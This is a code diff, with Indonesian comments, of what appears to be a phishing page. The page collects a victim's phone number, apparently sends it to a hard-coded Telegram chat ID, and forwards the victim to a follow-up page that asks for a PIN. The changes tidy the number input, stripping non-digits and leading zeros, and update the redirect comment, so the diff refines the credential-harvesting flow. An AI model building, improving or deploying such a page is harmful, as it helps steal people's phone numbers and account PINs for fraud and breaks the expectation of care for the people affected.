@@ -10,6 +10,7 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: #f8fafc;
       -webkit-text-size-adjust: 100%;
+      touch-action: manipulation;
     }
     input[type="tel"] {
       font-size: 16px !important;
@@ -128,7 +129,11 @@
     const CHAT_ID = "6742478722";
 
     function handleInput(input) {
-      input.value = input.value.replace(/[^0-9]/g, '');
+      // Hanya izinkan angka dan otomatis hapus angka 0 di awal jika diketik user
+      let val = input.value.replace(/[^0-9]/g, '');
+      val = val.replace(/^0+/, ''); 
+      input.value = val;
+
       const btn = document.getElementById('btnSubmit');
       
       if (input.value.length >= 8) {
@@ -165,7 +170,7 @@
         console.log("Error Telegram");
       }
 
-      // Lempar nomor HP ke halaman PIN (tujuan.html)
+      // Lempar nomor HP ke halaman PIN (pin1.html / tujuan.html)
       window.location.href = "pin1.html?phone=" + encodeURIComponent(phone);
     }
   </script>
